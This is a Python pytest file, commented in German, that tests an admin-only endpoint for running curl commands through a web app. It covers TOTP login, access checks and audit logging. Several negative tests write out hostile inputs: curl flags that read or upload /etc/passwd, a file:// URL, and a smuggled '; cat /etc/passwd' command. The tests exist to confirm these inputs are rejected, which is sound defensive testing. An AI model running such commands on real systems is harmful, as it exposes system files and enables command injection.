"""Tests fuer die Curl-Webshell. Gegen einen echten lokalen HTTP-Server
mit dem ECHTEN curl-Binary verifiziert (kein Mock -- die Sicherheits-
grenzen muessen gegen den tatsaechlichen Prozessaufruf standhalten).
"""

import subprocess
import sys
import time

import pytest

from tests.conftest import create_admin as _create_admin


ECHO_SERVER_CODE = '''
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

class EchoHandler(BaseHTTPRequestHandler):
    def _handle(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        payload = {"method": self.command, "headers": dict(self.headers), "body": body}
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(payload).encode())

    def do_GET(self): self._handle()
    def do_POST(self): self._handle()
    def log_message(self, *args): pass

HTTPServer(("127.0.0.1", 18897), EchoHandler).serve_forever()
'''


@pytest.fixture(scope="module")
def echo_server():
    proc = subprocess.Popen([sys.executable, "-c", ECHO_SERVER_CODE])
    time.sleep(0.5)
    yield "http://127.0.0.1:18897"
    proc.terminate()
    proc.wait(timeout=5)


def _login_with_totp_setup(client, username: str, password: str) -> None:
    import pyotp

    r = client.post("/api/v1/auth/login", json={"username": username, "password": password})
    pending_token = r.json()["pending_token"]
    r = client.post("/api/v1/auth/2fa/totp/setup/start", json={"pending_token": pending_token})
    secret = r.json()["secret"]
    code = pyotp.TOTP(secret).now()
    client.post("/api/v1/auth/2fa/totp/setup/verify", json={"pending_token": pending_token, "code": code})


def test_requires_admin(client):
    from app.core.db import SessionLocal
    from app.core.security import hash_password
    from app.models.user import User, UserRole

    db = SessionLocal()
    db.add(User(username="member1", password_hash=hash_password("AuchEinSicheresPW123"), role=UserRole.MEMBER.value, is_active=True))
    db.commit()
    db.close()

    _login_with_totp_setup(client, "member1", "AuchEinSicheresPW123")
    r = client.post("/api/v1/curl-webshell", json={"command": "curl http://example.com"})
    assert r.status_code == 403


def test_executes_allowed_command(client, echo_server):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": f'curl -s -H "X-Test: hallo" {echo_server}/test'})
    assert r.status_code == 200
    data = r.json()
    assert data["exit_code"] == 0
    assert "X-Test" in data["output"]


def test_post_with_data(client, echo_server):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": f'curl -s -X POST -d "key=value" {echo_server}/api'})
    assert r.status_code == 200
    data = r.json()
    assert data["exit_code"] == 0
    assert "key=value" in data["output"]


def test_rejects_non_curl_command(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "wget http://example.com"})
    assert r.status_code == 422


def test_rejects_disallowed_flag(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl --upload-file /etc/passwd http://example.com"})
    assert r.status_code == 403


def test_rejects_at_file_syntax_in_data(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl -d @/etc/passwd http://example.com"})
    assert r.status_code == 403


def test_rejects_at_file_syntax_with_equals_form(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl --data=@/etc/passwd http://example.com"})
    assert r.status_code == 403


def test_rejects_file_scheme(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl file:///etc/passwd"})
    assert r.status_code == 403


def test_rejects_config_flag(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl -K /etc/passwd http://example.com"})
    assert r.status_code == 403


def test_rejects_cert_flags(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    for flag in ("--cert", "--key", "--cacert"):
        r = client.post("/api/v1/curl-webshell", json={"command": f"curl {flag} /etc/passwd http://example.com"})
        assert r.status_code == 403, f"{flag} haette abgelehnt werden sollen"


def test_shell_metacharacters_never_executed(client, echo_server):
    """Kein shell=True -- Semikolon/Pipe/Backtick werden nie als Shell-
    Syntax interpretiert, hoechstens als (ungueltiger) Teil eines
    curl-Arguments. Das Ergebnis darf in KEINEM Fall echte
    Shell-Befehlsausfuehrung zeigen (z.B. /etc/passwd-Inhalt)."""
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": f"curl {echo_server}/test; cat /etc/passwd"})
    # Wird entweder als "mehrere URLs" abgelehnt (422) oder curl selbst
    # scheitert am kaputten Argument -- in KEINEM Fall darf /etc/passwd
    # tatsaechlich ausgelesen worden sein.
    if r.status_code == 200:
        assert "root:" not in r.json()["output"]
    else:
        assert r.status_code in (403, 422)


def test_rejects_empty_command(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "   "})
    assert r.status_code == 422


def test_rejects_missing_url(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl -s"})
    assert r.status_code == 422


def test_rejects_multiple_urls(client):
    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    r = client.post("/api/v1/curl-webshell", json={"command": "curl http://a.example.com http://b.example.com"})
    assert r.status_code == 422


def test_logs_to_audit_log(client, echo_server):
    from app.core.db import SessionLocal
    from app.models.user import AuditLogEntry

    password = _create_admin()
    _login_with_totp_setup(client, "admin", password)

    client.post("/api/v1/curl-webshell", json={"command": f"curl -s {echo_server}/test"})

    db = SessionLocal()
    entry = db.query(AuditLogEntry).filter_by(event_type="curl_webshell_run").first()
    db.close()
    assert entry is not None
    assert entry.username == "admin"
    assert "curl" in entry.detail
